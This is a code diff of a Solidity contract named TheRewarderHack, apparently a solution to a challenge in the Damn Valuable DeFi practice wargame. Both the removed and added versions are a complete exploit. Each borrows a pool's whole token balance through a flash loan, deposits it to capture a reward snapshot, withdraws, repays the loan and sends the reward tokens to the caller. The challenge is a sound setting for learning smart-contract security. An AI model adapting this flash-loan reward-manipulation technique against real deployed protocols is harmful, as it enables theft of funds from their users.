@@ -1,45 +1,41 @@
 // SPDX-License-Identifier: MIT
+
 pragma solidity ^0.8.0;
 
+import "../DamnValuableToken.sol";
 import "../the-rewarder/FlashLoanerPool.sol";
+// import "../the-rewarder/RewardToken.sol";
+// import "../the-rewarder/AccountingToken.sol";
 import "../the-rewarder/TheRewarderPool.sol";
 
 contract TheRewarderHack {
-    FlashLoanerPool immutable flashLoanerPool;
-    TheRewarderPool immutable rewarderPool;
-    DamnValuableToken immutable liquidityToken;
-    RewardToken immutable rewardToken;
+    FlashLoanerPool public pool;
+    DamnValuableToken public token;
+    TheRewarderPool public rewardPool;
+    RewardToken public reward;
 
     constructor(
-        address _flashLoanerPool,
+        address _pool,
         address _token,
-        address _rewarderPool
+        address _rewardPool,
+        address _reward
     ) {
-        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
-        rewarderPool = TheRewarderPool(_rewarderPool);
-        liquidityToken = DamnValuableToken(_token);
-        rewardToken = RewardToken(_rewarderPool);
+        pool = FlashLoanerPool(_pool);
+        token = DamnValuableToken(_token);
+        rewardPool = TheRewarderPool(_rewardPool);
+        reward = RewardToken(_reward);
     }
 
-    // Only start the exploit if TheRewarderPool's lastRecordedSnapshotTimestamp is older than 5 days!
+    fallback() external {
+        uint256 balance = token.balanceOf(address(this));
+        token.approve(address(rewardPool), balance);
+        rewardPool.deposit(balance);
+        rewardPool.withdraw(balance);
+        token.transfer(address(pool), balance);
+    }
+
     function attack() external {
-        // Take a loan.
-        flashLoanerPool.flashLoan(
-            liquidityToken.balanceOf(address(flashLoanerPool))
-        ); // Triggers callback.
-    }
-
-    // The flashloan callback.
-    function receiveFlashLoan(uint256 amount) external {
-        // Deposit all of the borrowed tokens.
-        liquidityToken.approve(address(rewarderPool), amount);
-        rewarderPool.deposit(amount); // Triggers snapshot and distribution of rewards.
-        // Transfer rewards to attacker EOA.
-        uint256 rewards = rewarderPool.distributeRewards(); // Doesn't have any effect but quickly gives us the amount of rewards.
-        rewardToken.transfer(msg.sender, rewards);
-        // Withdraw all of the liquidity tokens again.
-        rewarderPool.withdraw(amount);
-        // Pay back the flash loan.
-        liquidityToken.transfer(address(flashLoanerPool), amount);
+        pool.flashLoan(token.balanceOf(address(pool)));
+        reward.transfer(msg.sender, reward.balanceOf(address(this)));
     }
 }
